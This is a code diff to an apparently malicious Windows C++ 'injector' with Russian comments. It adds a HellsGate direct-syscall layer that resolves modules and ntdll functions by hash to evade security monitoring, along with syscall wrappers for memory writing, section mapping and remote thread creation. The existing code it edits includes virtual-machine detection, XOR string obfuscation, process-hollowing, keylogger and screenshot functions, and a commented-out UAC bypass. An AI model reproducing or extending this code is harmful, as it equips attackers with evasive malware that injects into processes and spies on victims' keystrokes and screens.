@@ -1,24 +1,461 @@
 #include "injector.h"
 #include <stdio.h>  // Для printf / sprintf
 #include <stdlib.h> // Для malloc / free
-#include <string.h> // Для strlen / strcpy
+#include <string.h> // Для strlen / strcpy / strncmp / memcpy
 #include <windows.h>
-#include <winternl.h> // Для структур PEB
+// #include <winternl.h> // УДАЛЕНО - используем кастомные структуры / HellsGate
 #include <iphlpapi.h> // Для GetAdaptersInfo
 #include <psapi.h>    // Для EnumProcesses (хотя пока не используем)
-#include <intrin.h>   // Для __cpuid
+#include <intrin.h>   // Для __cpuid / __readgsqword / __readfsdword
 #include <tlhelp32.h> // Для поиска процессов (хотя можно и без него, через GetShellWindow)
 #include <userenv.h>  // Для CreateProcessWithTokenW
 #include <vector>     // Для буфера логов (временное решение)
 #include <string>     // Для буфера логов
 #include <mutex>      // Для защиты буфера
 #include <sstream>    // Для сборки JSON
-#include <Shlwapi.h>  // Для PathMatchSpecW
 #include <comdef.h> // Для _com_error, _bstr_t, _variant_t (если решим использовать)
+#include <iostream>
 
 #pragma comment(lib, "iphlpapi.lib") // Линковка с библиотекой для GetAdaptersInfo
 #pragma comment(lib, "Userenv.lib") // Линковка с userenv.lib
-#pragma comment(lib, "Shlwapi.lib") // Линковка с Shlwapi.lib
+
+// --- HellsGate Implementation ---
+
+#define KERNEL32DLL_HASH   0x6A4ABC5B // Hash for kernel32.dll
+#define NTDLLDLL_HASH      0x3CFA685D // Hash for ntdll.dll
+#define LOADLIBRARYA_HASH  0xEC0E4E8E // Hash for LoadLibraryA
+#define GETPROCADDRESS_HASH 0x7C0DFCAA // Hash for GetProcAddress
+#define VIRTUALALLOC_HASH  0x91AFCA54 // Hash for VirtualAlloc
+// Hashes for anchor syscalls (can use others, these are common)
+#define NtAllocateVirtualMemory_HASH 0x6793C34C
+#define NtProtectVirtualMemory_HASH  0x082962C8 // Corrected hash value
+// Add hashes for other needed syscalls
+#define NtWriteVirtualMemory_HASH    0x95F3A792
+#define NtMapViewOfSection_HASH      0x231F196A
+#define NtCreateThreadEx_HASH        0xCB0C2130
+#define NtUnmapViewOfSection_HASH    0x595014AD
+#define NtQueryInformationProcess_HASH 0x10F8132F // djb2("NtQueryInformationProcess")
+
+// Simple hash function (djb2)
+DWORD dwGetHash( char * cApiName )
+{
+    DWORD dwHash = 5381;
+    while( *cApiName )
+    {
+        dwHash = ( ( dwHash << 5 ) + dwHash ) + (unsigned char)*cApiName;
+        cApiName++;
+    }
+    return dwHash;
+}
+
+// Structure to hold export information
+typedef struct _EXPORT_ENTRY {
+    ULONG_PTR pAddress;
+    DWORD dwHash;
+} EXPORT_ENTRY, *PEXPORT_ENTRY;
+
+// Helper structure for HellsGate context
+typedef struct _HELLSGATE_CONTEXT {
+    PEXPORT_ENTRY pExports;
+    DWORD dwNumberOfExports;
+    HMODULE hNtdll;
+    BOOL bInitialized;
+    DWORD dwFirstSyscallNumber; // Syscall number of the first validated function in the sorted list
+    ULONG_PTR pFirstSyscallAddress; // Address of the first validated function
+} HELLSGATE_CONTEXT, *PHELLSGATE_CONTEXT;
+
+// Global context for HellsGate (or pass it around)
+HELLSGATE_CONTEXT g_HellsGateContext = { 0 };
+
+// Comparison function for qsort
+int CompareExportEntries(const void* a, const void* b) {
+    PEXPORT_ENTRY entryA = (PEXPORT_ENTRY)a;
+    PEXPORT_ENTRY entryB = (PEXPORT_ENTRY)b;
+    if (entryA->pAddress < entryB->pAddress) return -1;
+    if (entryA->pAddress > entryB->pAddress) return 1;
+    return 0;
+}
+
+// Minimal PEB/LDR structures (avoiding winternl.h)
+// Minimal PEB structures (simplified versions, ensure architecture correctness)
+typedef struct _UNICODE_STRING_MIN {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING_MIN, *PUNICODE_STRING_MIN;
+
+#if defined(_WIN64)
+#define OFFSET_PEB_LDR 0x18
+#define OFFSET_LDR_DATA_InMemoryOrderModuleList 0x10 // Offset of InMemoryOrderModuleList within PEB_LDR_DATA
+#define OFFSET_LDR_DATA_TABLE_ENTRY_InMemoryOrderLinks 0x00 // InMemoryOrderLinks is the first member
+#define OFFSET_LDR_DATA_TABLE_ENTRY_DllBase 0x30
+#define OFFSET_LDR_DATA_TABLE_ENTRY_BaseDllName 0x58
+#else // _WIN32
+#define OFFSET_PEB_LDR 0x0C
+#define OFFSET_LDR_DATA_InMemoryOrderModuleList 0x0C // Offset of InMemoryOrderModuleList within PEB_LDR_DATA
+#define OFFSET_LDR_DATA_TABLE_ENTRY_InMemoryOrderLinks 0x00
+#define OFFSET_LDR_DATA_TABLE_ENTRY_DllBase 0x18
+#define OFFSET_LDR_DATA_TABLE_ENTRY_BaseDllName 0x2C
+#endif
+
+// Macro to get field from PEB LDR Data Table Entry using offset
+#define GET_LDR_ENTRY_FIELD(entryPtr, offset, type) (*(type*)((BYTE*)(entryPtr) + (offset)))
+
+// Find the base address of a loaded module by hash (using PEB traversal and offsets)
+HMODULE GetModuleBaseByHash(DWORD dwModuleHash)
+{
+    ULONG_PTR pPeb;
+    ULONG_PTR pLdr;
+    LIST_ENTRY* pListHead;
+    LIST_ENTRY* pListEntry;
+
+#if defined(_WIN64)
+    pPeb = (ULONG_PTR)__readgsqword(0x60);
+#else // _WIN32
+    pPeb = (ULONG_PTR)__readfsdword(0x30);
+#endif
+
+    if (!pPeb) return NULL;
+
+    pLdr = *(ULONG_PTR*)(pPeb + OFFSET_PEB_LDR);
+    if (!pLdr) return NULL;
+
+    pListHead = (LIST_ENTRY*)(pLdr + OFFSET_LDR_DATA_InMemoryOrderModuleList);
+    pListEntry = pListHead->Flink;
+
+    while (pListEntry != pListHead)
+    {
+        BYTE* pLdrEntry = (BYTE*)pListEntry; // Base address of LDR_DATA_TABLE_ENTRY
+        UNICODE_STRING_MIN* pBaseDllName = (UNICODE_STRING_MIN*)((BYTE*)pLdrEntry + OFFSET_LDR_DATA_TABLE_ENTRY_BaseDllName);
+
+        if (pBaseDllName && pBaseDllName->Buffer && pBaseDllName->Length > 0)
+        {
+            char szModuleName[MAX_PATH];
+            int i = 0;
+            while (i < (pBaseDllName->Length / sizeof(WCHAR)) && i < MAX_PATH - 1)
+            {
+                WCHAR wc = pBaseDllName->Buffer[i];
+                if (wc >= 'A' && wc <= 'Z')
+                    szModuleName[i] = (char)(wc + ('a' - 'A'));
+                else
+                    szModuleName[i] = (char)wc;
+                i++;
+            }
+            szModuleName[i] = '\\0';
+
+            if (dwGetHash(szModuleName) == dwModuleHash)
+            {
+                return (HMODULE)GET_LDR_ENTRY_FIELD(pLdrEntry, OFFSET_LDR_DATA_TABLE_ENTRY_DllBase, PVOID);
+            }
+        }
+        // Get next entry using InMemoryOrderLinks offset
+        pListEntry = GET_LDR_ENTRY_FIELD(pLdrEntry, OFFSET_LDR_DATA_TABLE_ENTRY_InMemoryOrderLinks, LIST_ENTRY*);
+    }
+    return NULL;
+}
+
+// Find the address of an exported function by hash (parsing PE Export Table)
+FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwProcHash)
+{
+    if (!hModule) return NULL;
+
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
+    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    // Check optional header magic
+#ifdef _WIN64
+    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return NULL;
+#else
+    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) return NULL;
+#endif
+
+    DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD exportSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+    if (!exportRVA || !exportSize) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + exportRVA);
+    if (!pExportDir->AddressOfFunctions || !pExportDir->AddressOfNames || !pExportDir->AddressOfNameOrdinals) return NULL;
+
+    PDWORD pdwFunctions = (PDWORD)((LPBYTE)hModule + pExportDir->AddressOfFunctions);
+    PDWORD pdwNames = (PDWORD)((LPBYTE)hModule + pExportDir->AddressOfNames);
+    PWORD pwOrdinals = (PWORD)((LPBYTE)hModule + pExportDir->AddressOfNameOrdinals);
+
+    // Search by name hash
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
+    {
+        char* szName = (char*)((LPBYTE)hModule + pdwNames[i]);
+        if (dwGetHash(szName) == dwProcHash)
+        {
+            // Check for forwarded export? Optional.
+            ULONG_PTR funcRVA = pdwFunctions[pwOrdinals[i]];
+             // Check if the RVA points within the Export Directory itself (forwarded export)
+            if (funcRVA >= exportRVA && funcRVA < (exportRVA + exportSize)) {
+                // TODO: Handle forwarded exports if necessary (parse the forwarded string)
+                printf("[GetProcAddressByHash] Warning: Forwarded export detected for hash 0x%X, not handled.\\n", dwProcHash);
+                return NULL; 
+            }
+            return (FARPROC)((LPBYTE)hModule + funcRVA);
+        }
+    }
+
+    return NULL; // Function not found by name hash
+}
+
+// Function to parse NTDLL EAT and initialize HellsGate context
+BOOL InitializeHellsGate()
+{
+    if (g_HellsGateContext.bInitialized) return TRUE;
+    printf("[HellsGate] Initializing...\\n");
+
+    g_HellsGateContext.hNtdll = GetModuleBaseByHash(NTDLLDLL_HASH);
+    if (!g_HellsGateContext.hNtdll) {
+         printf("[HellsGate] Failed to get ntdll.dll base address.\\n");
+         return FALSE;
+    }
+    printf("[HellsGate] ntdll.dll base: %p\\n", g_HellsGateContext.hNtdll);
+
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)g_HellsGateContext.hNtdll;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)g_HellsGateContext.hNtdll + pDosHeader->e_lfanew);
+    DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+     if (!exportRVA) {
+        printf("[HellsGate] Failed to get Export Directory RVA.\\n");
+        return FALSE;
+     }
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)g_HellsGateContext.hNtdll + exportRVA);
+
+    if (!pExportDir || !pExportDir->NumberOfNames || !pExportDir->AddressOfNames || !pExportDir->AddressOfFunctions || !pExportDir->AddressOfNameOrdinals) {
+         printf("[HellsGate] Invalid Export Directory structure.\\n");
+        return FALSE;
+    }
+     printf("[HellsGate] Found %lu exported names.\\n", pExportDir->NumberOfNames);
+
+    PDWORD pdwFunctions = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfFunctions);
+    PDWORD pdwNames = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNames);
+    PWORD pwOrdinals = (PWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNameOrdinals);
+
+    g_HellsGateContext.dwNumberOfExports = pExportDir->NumberOfNames; // Initial estimate
+    // Allocate memory for exports (using VirtualAlloc for potential stealth)
+    g_HellsGateContext.pExports = (PEXPORT_ENTRY)VirtualAlloc(NULL, g_HellsGateContext.dwNumberOfExports * sizeof(EXPORT_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!g_HellsGateContext.pExports) {
+         printf("[HellsGate] Failed to allocate memory for exports.\\n");
+        return FALSE;
+    }
+
+    DWORD dwValidExports = 0;
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+        char* szName = (char*)((LPBYTE)g_HellsGateContext.hNtdll + pdwNames[i]);
+        if (szName) {
+            ULONG_PTR pFuncAddress = (ULONG_PTR)((LPBYTE)g_HellsGateContext.hNtdll + pdwFunctions[pwOrdinals[i]]);
+            // Basic check: only consider functions starting with 'Nt' (Zw are aliases)
+            if (strncmp(szName, "Nt", 2) == 0) {
+                 g_HellsGateContext.pExports[dwValidExports].pAddress = pFuncAddress;
+                 g_HellsGateContext.pExports[dwValidExports].dwHash = dwGetHash(szName); // Use existing hash function
+                 dwValidExports++;
+            }
+        }
+    }
+     g_HellsGateContext.dwNumberOfExports = dwValidExports; // Update count to actual Nt* exports found
+     printf("[HellsGate] Found %lu Nt* functions.\\n", dwValidExports);
+
+    // Sort exports by address
+    qsort(g_HellsGateContext.pExports, g_HellsGateContext.dwNumberOfExports, sizeof(EXPORT_ENTRY), CompareExportEntries);
+
+    // --- Find the Gate ---
+    printf("[HellsGate] Searching for the gate (sequential syscall numbers)...\\n");
+    DWORD dwSyscallNum1 = 0xFFFFFFFF, dwSyscallNum2 = 0xFFFFFFFF;
+
+    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports - 1; i++) { // Iterate up to second-to-last
+         BYTE* pFuncBytes1 = (BYTE*)g_HellsGateContext.pExports[i].pAddress;
+         BYTE* pFuncBytes2 = (BYTE*)g_HellsGateContext.pExports[i+1].pAddress;
+
+         // Basic check for x64 syscall stub pattern
+         // mov r10, rcx       ; 4C 8B D1
+         // mov eax, syscall_num ; B8 xx xx xx xx
+         // syscall            ; 0F 05
+         // ret                ; C3
+         // nop                ; 90 (optional padding)
+         if (pFuncBytes1[0] == 0x4C && pFuncBytes1[1] == 0x8B && pFuncBytes1[2] == 0xD1 &&
+             pFuncBytes1[3] == 0xB8 &&
+             pFuncBytes1[8] == 0x0F && pFuncBytes1[9] == 0x05 &&
+             pFuncBytes1[10] == 0xC3 &&
+             pFuncBytes2[0] == 0x4C && pFuncBytes2[1] == 0x8B && pFuncBytes2[2] == 0xD1 &&
+             pFuncBytes2[3] == 0xB8 &&
+             pFuncBytes2[8] == 0x0F && pFuncBytes2[9] == 0x05 &&
+             pFuncBytes2[10] == 0xC3)
+         {
+               dwSyscallNum1 = *(DWORD*)(pFuncBytes1 + 4); // Get syscall number from mov eax, imm32
+               dwSyscallNum2 = *(DWORD*)(pFuncBytes2 + 4);
+
+               // Check if they are sequential
+               if (dwSyscallNum2 == dwSyscallNum1 + 1) {
+                     g_HellsGateContext.pFirstSyscallAddress = g_HellsGateContext.pExports[i].pAddress;
+                     g_HellsGateContext.dwFirstSyscallNumber = dwSyscallNum1;
+                     g_HellsGateContext.bInitialized = TRUE;
+                     printf("[HellsGate] Gate found! First syscall Addr: %p, Num: 0x%X (%lu)\\n",
+                           (void*)g_HellsGateContext.pFirstSyscallAddress,
+                           g_HellsGateContext.dwFirstSyscallNumber, g_HellsGateContext.dwFirstSyscallNumber);
+                     // Optionally free memory used for export names if not needed anymore
+                     // VirtualFree(...)
+                     return TRUE; // Gate found!
+               }
+         }
+    }
+
+    // Gate not found - cleanup and return error
+    printf("[HellsGate] Gate not found! Failed to validate syscall sequence.\\n");
+    VirtualFree(g_HellsGateContext.pExports, 0, MEM_RELEASE);
+    g_HellsGateContext.pExports = NULL;
+    g_HellsGateContext.dwNumberOfExports = 0;
+    return FALSE;
+}
+
+// Function to get syscall number using HellsGate
+DWORD GetSyscallNumberByHashHellsGate(DWORD dwFunctionHash)
+{
+    if (!g_HellsGateContext.bInitialized) {
+        if (!InitializeHellsGate()) {
+            return 0xFFFFFFFF; // Indicate error
+        }
+    }
+
+    // Find the target function index and the first syscall index in the sorted list
+    DWORD firstSyscallIndex = 0xFFFFFFFF;
+    DWORD targetIndex = 0xFFFFFFFF;
+
+    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports; i++) {
+        if (g_HellsGateContext.pExports[i].pAddress == g_HellsGateContext.pFirstSyscallAddress) {
+            firstSyscallIndex = i;
+        }
+        if (g_HellsGateContext.pExports[i].dwHash == dwFunctionHash) {
+            targetIndex = i;
+        }
+        if (firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF) {
+            break; // Found both
+        }
+    }
+
+    if (firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF) {
+        // Calculate the target syscall number based on the index difference
+        DWORD syscallNumber = g_HellsGateContext.dwFirstSyscallNumber + (targetIndex - firstSyscallIndex);
+         printf("[HellsGate] Found Syscall Number for hash 0x%X: 0x%X (%lu)\\n", dwFunctionHash, syscallNumber, syscallNumber);
+        return syscallNumber;
+    } else {
+         printf("[HellsGate] Failed to find index for target hash 0x%X or first syscall address.\\n", dwFunctionHash);
+        return 0xFFFFFFFF; // Target or first syscall index not found
+    }
+}
+
+// --- End HellsGate Implementation ---
+
+
+// --- Direct Syscall Wrappers ---
+
+// DirectSyscall_NtWriteVirtualMemory
+__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
+    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } } // Basic error handling
+    __asm {
+        mov eax, syscallNumber
+        mov r10, rcx
+        syscall
+        ret
+    }
+}
+
+// DirectSyscall_NtMapViewOfSection
+__declspec(naked) NTSTATUS DirectSyscall_NtMapViewOfSection(
+    HANDLE SectionHandle,
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    ULONG_PTR ZeroBits,
+    SIZE_T CommitSize,
+    PLARGE_INTEGER SectionOffset, // Optional pointer
+    PSIZE_T ViewSize,             // In/Out pointer
+    DWORD InheritDisposition,     // SECTION_INHERIT enum replacement
+    ULONG AllocationType,
+    ULONG Win32Protect)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtMapViewOfSection_HASH);
+    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
+    __asm {
+        mov eax, syscallNumber
+        mov r10, rcx
+        syscall
+        ret
+    }
+}
+
+// DirectSyscall_NtCreateThreadEx
+__declspec(naked) NTSTATUS DirectSyscall_NtCreateThreadEx(
+    OUT PHANDLE hThread,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes, // Optional POBJECT_ATTRIBUTES pointer
+    IN HANDLE ProcessHandle,
+    IN PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE function pointer
+    IN PVOID Argument,     // Optional argument pointer
+    IN ULONG CreateFlags, // THREAD_CREATE_FLAGS, e.g., 0x00000004 for suspended
+    IN SIZE_T ZeroBits,
+    IN SIZE_T StackSize,
+    IN SIZE_T MaximumStackSize,
+    IN PVOID AttributeList // Optional PPS_ATTRIBUTE_LIST pointer
+    )
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtCreateThreadEx_HASH);
+    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
+    __asm {
+        mov eax, syscallNumber
+        mov r10, rcx
+        syscall
+        ret
+    }
+}
+
+// DirectSyscall_NtUnmapViewOfSection
+__declspec(naked) NTSTATUS DirectSyscall_NtUnmapViewOfSection(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress // Can be NULL
+)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtUnmapViewOfSection_HASH);
+    if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
+    __asm {
+        mov eax, syscallNumber
+        mov r10, rcx
+        syscall
+        ret
+    }
+}
+
+// DirectSyscall_NtQueryInformationProcess
+__declspec(naked) NTSTATUS DirectSyscall_NtQueryInformationProcess(
+    HANDLE ProcessHandle,
+    DWORD ProcessInformationClass, // PROCESSINFOCLASS enum replacement (e.g., 0 for ProcessBasicInformation)
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength,
+    PULONG ReturnLength // Optional pointer
+)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtQueryInformationProcess_HASH);
+     if (syscallNumber == 0xFFFFFFFF) { __asm { ret } }
+    __asm {
+        mov eax, syscallNumber
+        mov r10, rcx
+        syscall
+        ret
+    }
+}
+
+// --- End Direct Syscall Wrappers ---
+
 
 // --- Макрос и функция для XOR-обфускации строк ---
 #define XOR_KEY 0xAE // Простой ключ, можно сделать сложнее
@@ -227,7 +664,7 @@ BOOL IsVMEnvironmentDetected() {
         "C:\Windows\System32\drivers\vmx_svga.sys",
         "C:\Windows\System32\drivers\vmxnet.sys",
         "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
-        "C:\Program Files\Oracle\VirtualBox Guest Additions\",
+        "C:\Program Files\Oracle\VirtualBox Guest Additions\\",
         "C:\Windows\System32\drivers\hyperkbd.sys", // Hyper-V Keyboard
         "C:\Windows\System32\drivers\vmbus.sys",    // Hyper-V Virtual Machine Bus
         "C:\Windows\System32\drivers\Vhdmp.sys",    // Hyper-V VHD Driver
@@ -471,273 +908,153 @@ BOOL InitializeApiPointers() {
     if (g_apiPointersInitialized) {
         return TRUE;
     }
-    printf("[InitApi] Initializing API pointers...\n");
-
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    HMODULE hUser32 = GetModuleHandleA("user32.dll");
-    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
-    HMODULE hCrypt32 = LoadLibraryA("crypt32.dll"); // Загружаем Crypt32
-
-    if (!hNtdll || !hKernel32 || !hUser32 || !hGdi32 || !hCrypt32) {
-        printf("[InitApi] Failed to get module handles (NTDLL: %p, Kernel32: %p, User32: %p, GDI32: %p, Crypt32: %p)\n", 
-               hNtdll, hKernel32, hUser32, hGdi32, hCrypt32);
-        if (hCrypt32) FreeLibrary(hCrypt32); // Освобождаем, если загрузили
-        return FALSE;
+    printf("[InitApi] Initializing API pointers (using HellsGate and hashing)...\n");
+    
+    // Инициализируем HellsGate ПЕРЕД получением других указателей
+    if (!InitializeHellsGate()) {
+        printf("[InitApi] CRITICAL: Failed to initialize HellsGate. Direct Syscalls unavailable.\n");
+        // return FALSE; // Можно сделать инициализацию HellsGate обязательной
     }
 
-    // --- Process Hollowing pointers ---
-    ObfuscatedString ntUnmapName = OBFUSCATED("NtUnmapViewOfSection");
-    char* szNtUnmapName = deobfuscate(ntUnmapName.data, ntUnmapName.length);
-    g_api.ptrNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, szNtUnmapName);
-    free(szNtUnmapName);
+    // Получаем хендлы модулей через наш GetModuleBaseByHash
+    HMODULE hKernel32 = GetModuleBaseByHash(KERNEL32DLL_HASH);
+    HMODULE hUser32 = GetModuleBaseByHash(0x4A3A8AC); // djb2("user32.dll")
+    HMODULE hGdi32 = GetModuleBaseByHash(0x8F0EBD79); // djb2("gdi32.dll")
+    HMODULE hCrypt32 = GetModuleBaseByHash(0x4B67439F); // djb2("crypt32.dll")
+    HMODULE hShell32 = GetModuleBaseByHash(0xFD4D66C); // djb2("shell32.dll")
+    HMODULE hOle32 = GetModuleBaseByHash(0x36F5780E); // djb2("ole32.dll")
+    HMODULE hGdiplus = GetModuleBaseByHash(0x3AD3242F); // djb2("gdiplus.dll")
+    HMODULE hIphlpapi = GetModuleBaseByHash(0x28413F4E); // djb2("iphlpapi.dll")
 
-    ObfuscatedString ntQueryName = OBFUSCATED("NtQueryInformationProcess");
-    char* szNtQueryName = deobfuscate(ntQueryName.data, ntQueryName.length);
-    g_api.ptrNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, szNtQueryName);
-    free(szNtQueryName);
-
-    ObfuscatedString createProcessName = OBFUSCATED("CreateProcessA");
-    char* szCreateProcessName = deobfuscate(createProcessName.data, createProcessName.length);
-    g_api.ptrCreateProcessA = (CreateProcessA_t)GetProcAddress(hKernel32, szCreateProcessName);
-    free(szCreateProcessName);
-
-    // Проверка указателей Process Hollowing
-    if (!g_api.ptrNtUnmapViewOfSection || !g_api.ptrNtQueryInformationProcess || !g_api.ptrCreateProcessA) {
-        printf("[InitApi] Failed to get one or more API function addresses for Process Hollowing.\n");
-        if (hCrypt32) FreeLibrary(hCrypt32);
-            return FALSE; 
-        }
-     printf("[InitApi] Process Hollowing API pointers initialized successfully.\n");
-
-    // --- UAC Bypass pointers (закомментировано) ---
-    /* ... */
-
-    // --- Keylogger pointers ---
-    // Загружаем указатели для кейлоггера
-    // ... (существующий код загрузки указателей кейлоггера) ...
-    // Проверка указателей кейлоггера
-    if (!g_api.ptrSetWindowsHookExW || !g_api.ptrUnhookWindowsHookEx || !g_api.ptrCallNextHookEx || 
-        !g_api.ptrGetAsyncKeyState || !g_api.ptrGetMessageW || !g_api.ptrTranslateMessage || !g_api.ptrDispatchMessageW ||
-        !g_api.ptrToUnicode || !g_api.ptrGetKeyboardState || !g_api.ptrWideCharToMultiByte) {
-            printf("[InitApi] Failed to get one or more API function addresses for keylogger.\n");
-        if (hCrypt32) FreeLibrary(hCrypt32);
-            return FALSE;
-        }
-         printf("[InitApi] Keylogger API pointers initialized successfully.\n");
-
-    // --- Screenshot pointers (GDI & Crypt32) ---
-    ObfuscatedString getDCName = OBFUSCATED("GetDC");
-    char* szGetDCName = deobfuscate(getDCName.data, getDCName.length);
-    g_api.ptrGetDC = (GetDC_t)GetProcAddress(hUser32, szGetDCName);
-    free(szGetDCName);
-
-    ObfuscatedString createCompatibleDCName = OBFUSCATED("CreateCompatibleDC");
-    char* szCreateCompatibleDCName = deobfuscate(createCompatibleDCName.data, createCompatibleDCName.length);
-    g_api.ptrCreateCompatibleDC = (CreateCompatibleDC_t)GetProcAddress(hGdi32, szCreateCompatibleDCName);
-    free(szCreateCompatibleDCName);
-
-    ObfuscatedString getDeviceCapsName = OBFUSCATED("GetDeviceCaps");
-    char* szGetDeviceCapsName = deobfuscate(getDeviceCapsName.data, getDeviceCapsName.length);
-    g_api.ptrGetDeviceCaps = (GetDeviceCaps_t)GetProcAddress(hGdi32, szGetDeviceCapsName);
-    free(szGetDeviceCapsName);
-
-    ObfuscatedString createCompatibleBitmapName = OBFUSCATED("CreateCompatibleBitmap");
-    char* szCreateCompatibleBitmapName = deobfuscate(createCompatibleBitmapName.data, createCompatibleBitmapName.length);
-    g_api.ptrCreateCompatibleBitmap = (CreateCompatibleBitmap_t)GetProcAddress(hGdi32, szCreateCompatibleBitmapName);
-    free(szCreateCompatibleBitmapName);
-
-    ObfuscatedString selectObjectName = OBFUSCATED("SelectObject");
-    char* szSelectObjectName = deobfuscate(selectObjectName.data, selectObjectName.length);
-    g_api.ptrSelectObject = (SelectObject_t)GetProcAddress(hGdi32, szSelectObjectName);
-    free(szSelectObjectName);
-
-    ObfuscatedString bitBltName = OBFUSCATED("BitBlt");
-    char* szBitBltName = deobfuscate(bitBltName.data, bitBltName.length);
-    g_api.ptrBitBlt = (BitBlt_t)GetProcAddress(hGdi32, szBitBltName);
-    free(szBitBltName);
-
-    ObfuscatedString deleteDCName = OBFUSCATED("DeleteDC");
-    char* szDeleteDCName = deobfuscate(deleteDCName.data, deleteDCName.length);
-    g_api.ptrDeleteDC = (DeleteDC_t)GetProcAddress(hGdi32, szDeleteDCName);
-    free(szDeleteDCName);
-
-    ObfuscatedString releaseDCName = OBFUSCATED("ReleaseDC");
-    char* szReleaseDCName = deobfuscate(releaseDCName.data, releaseDCName.length);
-    g_api.ptrReleaseDC = (ReleaseDC_t)GetProcAddress(hUser32, szReleaseDCName);
-    free(szReleaseDCName);
-
-    ObfuscatedString deleteObjectName = OBFUSCATED("DeleteObject");
-    char* szDeleteObjectName = deobfuscate(deleteObjectName.data, deleteObjectName.length);
-    g_api.ptrDeleteObject = (DeleteObject_t)GetProcAddress(hGdi32, szDeleteObjectName);
-    free(szDeleteObjectName);
-
-    ObfuscatedString getDIBitsName = OBFUSCATED("GetDIBits");
-    char* szGetDIBitsName = deobfuscate(getDIBitsName.data, getDIBitsName.length);
-    g_api.ptrGetDIBits = (GetDIBits_t)GetProcAddress(hGdi32, szGetDIBitsName);
-    free(szGetDIBitsName);
-
-    ObfuscatedString cryptBinaryToStringAName = OBFUSCATED("CryptBinaryToStringA");
-    char* szCryptBinaryToStringAName = deobfuscate(cryptBinaryToStringAName.data, cryptBinaryToStringAName.length);
-    g_api.ptrCryptBinaryToStringA = (CryptBinaryToStringA_t)GetProcAddress(hCrypt32, szCryptBinaryToStringAName);
-    free(szCryptBinaryToStringAName);
-
-    ObfuscatedString localFreeName = OBFUSCATED("LocalFree");
-    char* szLocalFreeName = deobfuscate(localFreeName.data, localFreeName.length);
-    g_api.ptrLocalFree = (LocalFree_t)GetProcAddress(hKernel32, szLocalFreeName);
-    free(szLocalFreeName);
-
-    // Проверка указателей Screenshot
-    if (!g_api.ptrGetDC || !g_api.ptrCreateCompatibleDC || !g_api.ptrGetDeviceCaps || 
-        !g_api.ptrCreateCompatibleBitmap || !g_api.ptrSelectObject || !g_api.ptrBitBlt || 
-        !g_api.ptrDeleteDC || !g_api.ptrReleaseDC || !g_api.ptrDeleteObject || 
-        !g_api.ptrCryptBinaryToStringA || !g_api.ptrLocalFree) 
-    {
-        printf("[InitApi] Failed to get one or more API function addresses for Screenshot.\n");
-        if (hCrypt32) FreeLibrary(hCrypt32); // Освобождаем библиотеку Crypt32
-        return FALSE;
+    if (!hKernel32) { 
+        printf("[InitApi] Failed to get Kernel32 handle! Cannot continue.\n"); 
+        return FALSE; 
     }
-    printf("[InitApi] Screenshot API pointers initialized successfully.\n");
+     printf("[InitApi] Kernel32 handle: %p\n", hKernel32);
+     // Проверка остальных хендлов опциональна, если функции из них не критичны
